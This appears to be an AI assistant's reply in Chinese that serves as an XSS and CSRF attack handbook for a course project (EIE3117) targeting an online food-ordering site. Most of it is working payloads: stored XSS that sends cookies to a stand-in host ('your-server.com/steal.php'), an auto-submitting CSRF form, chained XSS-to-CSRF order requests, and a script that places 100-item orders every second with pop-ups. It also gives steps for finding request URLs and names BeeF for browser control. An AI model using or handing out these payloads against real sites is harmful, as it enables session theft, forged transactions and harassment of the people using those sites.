完美 ✅！你这个是一个典型的在线点餐平台，功能包括注册登录、菜单创建、下单、订单查看。这个系统非常适合做 **XSS** 和 **CSRF** 的实战攻击练习，而且漏洞点几乎全覆盖了用户行为路径 🔥

---

# 🧨 EIE3117 Web #5 项目：XSS + CSRF 攻击手册

---

## 🎯 项目核心功能回顾（可攻击点）

| 功能                     | 潜在漏洞点                   |
|--------------------------|------------------------------|
| 用户注册/登录           | 登录态依赖 Cookie，可能无 Token |
| 用户资料（昵称、头像）  | 若页面输出未过滤，容易注入 XSS |
| 创建菜单                | 自由文本输入 = 高危 XSS 点 |
| 查看菜单 / 订单列表     | 页面展示内容 = XSS 传播载体 |
| 下单功能                | 一般是 POST，目标CSRF攻击 |
| 订单管理（餐厅）        | 用户权限+输入操作点 = 联动打击 |

---

# 🧪 一、XSS 攻击模板（跨站脚本）

---

## ✅ 1. Stored XSS（存储型） - 最佳利用点

> 攻击者向餐厅菜单名称或描述中插入恶意脚本，其他用户访问时触发

### 💣 攻击 Payload 示例：

```html
<script>
alert("XSS by Group 4");
</script>
```

或者更“实战”：

```html
<script>
fetch('https://your-server.com/steal.php?cookie=' + document.cookie)
</script>
```

### 🔥 注入位置建议：

- 菜单标题（dish title）
- 菜单描述（dish description）
- 用户昵称（nick name）

### ✅ 攻击流程：

1. 注册一个“餐厅用户”
2. 创建一道菜品，标题填写 XSS payload
3. 其他用户（尤其是管理员）访问菜单详情页即被触发

---

## ✅ 2. Reflected XSS（反射型）

测试 URL 参数是否被回显：

```
http://targetsite.com/view_menu.php?title=<script>alert(1)</script>
```



# 🧨 CSRF（含 URL 确认）


## 📌 一、目标系统功能概览（适配攻击）

| 功能点             | 攻击方式             |
|--------------------|----------------------|
| 用户昵称 / 菜名    | Stored XSS           |
| 注册 / 登录        | Cookie 劫持、XSS     |
| 创建菜单           | XSS 注入 + 联动CSRF  |
| 下订单             | 典型 CSRF 入口       |
| 查看订单 / 菜单页  | XSS 传播触发点       |

---

## 🧠 二、攻击前准备

- 攻击账户（如：餐厅用户、攻击者身份）
- 浏览器开启开发者工具（Chrome 或 Firefox）
- DVWA 或实际项目服务器运行正常

---

## 🔍 三、如何确认真实攻击 URL（CSRF 构造关键）

### ✅ 方法 1：使用开发者工具抓包

1. 打开目标系统
2. F12 → 切换到「Network」
3. 执行一次下单 / 修改密码等操作
4. 查看对应请求项 → 找到：
   - `Request URL`（如：`/order.php`）
   - `Request Method`（应为 POST）
   - 请求体参数（如 `menu_id=1&note=xxx`）

---

### ✅ 方法 2：查看网页源码 `<form>` 表单

1. 页面右键 → 查看源代码 或 F12 → Elements
2. 搜索 `<form` 标签，查看：
   - `action` 属性 → 确认请求路径
   - `method="POST"` → 可被模拟
   - 内部字段名：如 `name="menu_id"` 等

---

### ✅ 方法 3：使用 Burp Suite/ZAP 等代理拦截工具（进阶）

1. 启动 Burp → 设置浏览器代理（127.0.0.1:8080）
2. 执行操作 → 拦截请求
3. 复制 Request Header + Body 信息，用于构造攻击请求

---

## 🧪 四、CSRF 攻击模板构造（改密码 / 下订单）

### 🎯 示例攻击页面：

```html
<html>
  <body onload="document.forms[0].submit();">
    <form action="http://target.com/order.php" method="POST">
      <input type="hidden" name="menu_id" value="3">
      <input type="hidden" name="quantity" value="99">
      <input type="hidden" name="note" value="HackedByGroup9">
    </form>
  </body>
</html>
```

- 需要用户处于已登录状态（浏览器自动带 cookie）
- 页面一加载就自动提交攻击请求

---

## 💥 五、XSS 联动攻击模板（注入+CSRF）

注入到菜单名 / 描述等字段中：

```html
<script>
fetch("http://target.com/order.php", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "menu_id=3&quantity=1&note=Group9CSRF"
});
</script>
```

或无限骚扰 + 弹窗版本：

```html
<script>
setInterval(() => {
  fetch("http://target.com/order.php", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "menu_id=2&quantity=100&note=AnnoyByGroup9"
  });
  alert("Your order is out of control 😈");
}, 1000);
</script>
```

---

## 📌 六、注入建议位置（易传播）

- 菜单标题 / 描述
- 用户昵称
- 评论框（如有）
- 可编辑个人资料字段

---

## 🎁 七、攻击辅助工具（推荐使用）

| 工具         | 功能说明                  |
|--------------|---------------------------|
| Burp Suite   | 拦截请求 + 重放 + 构造    |
| OWASP ZAP    | 自动扫描 + 请求捕捉       |
| BeeF         | 控制 XSS 中毒用户浏览器   |
| Python+Requests | 模拟登录 + 发CSRF请求 |

---

## ✅ 八、安全验证建议（对方是否中招）

- 被篡改的字段是否改变（密码、菜单、订单）
- 页面是否频繁弹窗
- 日志中是否出现攻击记录
- 目标账户登录不了（密码已改）

---
